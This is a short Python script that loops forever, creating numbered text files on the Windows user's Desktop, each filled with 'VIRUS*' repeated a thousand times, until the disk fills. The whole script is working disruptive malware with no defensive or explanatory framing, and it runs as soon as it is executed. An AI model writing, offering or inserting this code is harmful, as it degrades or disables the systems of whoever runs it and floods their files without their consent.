import os

def filemaker():
    path = os.environ['USERPROFILE']
    file_number = 1
    while True:
        file = open(f'{path}\\Desktop\\file{file_number}.txt' ,'w')
        file.write("VIRUS*"*1000)
        file.close()
        file_number = file_number+1
filemaker()
